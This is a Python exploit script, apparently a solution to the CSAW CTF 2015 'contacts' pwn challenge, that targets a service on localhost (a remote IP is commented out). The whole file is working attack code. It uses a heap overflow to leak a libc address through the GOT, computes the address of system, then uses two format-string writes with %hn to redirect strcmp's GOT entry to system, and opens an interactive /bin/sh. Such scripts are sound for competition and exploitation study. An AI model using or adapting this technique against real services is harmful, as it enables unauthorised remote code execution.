import struct,socket,telnetlib
# csaw ctf 2015
# exploit 250 contacts

def shell():
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def p(addr):
	return struct.pack("<I",addr)

def read_until(token):
	data = ""
	while not data.endswith(token):
		data += f.read(1)
	return data
s = socket.create_connection(("127.0.0.1",12345))
#s = socket.create_connection(("54.165.223.128",2555))
f = s.makefile('rw',bufsize=0)

f.write("1\n") # create con
f.write("A" * 1 + "\n") # name
f.write("1234567" + "\n") # phone
f.write("100000\n") # desc len
f.write("A" * 1 + "\n")

f.write("1\n") # create con
f.write("B" * 1 + "\n") # name
f.write("1234567" + "\n") # phone
f.write("100000\n") # desc len
f.write("B" * 1 + "\n")

f.write("3\n") # edit
f.write("A" + "\n")
f.write("1\n") # change name

main_got = 0x0804b034

payload = "A" * 64 + p(0x01010101) + p(1) 
payload += p(main_got) # rewrite desc_p
payload += p(main_got) # rewrite phone_p
payload += "QQQQ" 

f.write(payload + "\n") # stage1 ---> leak address


f.write("4\n") # display
read_until("Phone #")
print read_until("Phone #")
leak = read_until("\n")

leak = struct.unpack("<I",leak[2:6])[0]

print "we get libc_main_address "
print hex(leak)

base = leak - 0x19970
system_libc = base + 0x3fcd0
print "we get libc system " + hex(system_libc)

f.write("1\n") # create
f.write("C\n") # name
f.write("123\n") # phone

rewrite = 0x0804b00c # strcmp got
rewrite2 = 0x0804b00e # strcmp got

system_libc_16 = system_libc & 0xffff
system_libc_32 = (system_libc >> 16) & 0xffff

fmt = "%" + str(system_libc_16) + "x"
fmt += "%9$hn" 
f.write(str(rewrite) + "\n") # length
f.write(fmt + "\n")
f.write("4\n") # display


f.write("1\n") # create for write seconnd part
f.write("AAAA\n") # name
f.write("123\n") # phone

f.write(str(rewrite2) + "\n")

fmt = "%" + str(system_libc_32) + "x"
fmt += "%9$hn" 
f.write(fmt + "\n")
f.write("4\n") # display

f.write("3\n") # edit
f.write("/bin/sh\n")

shell()
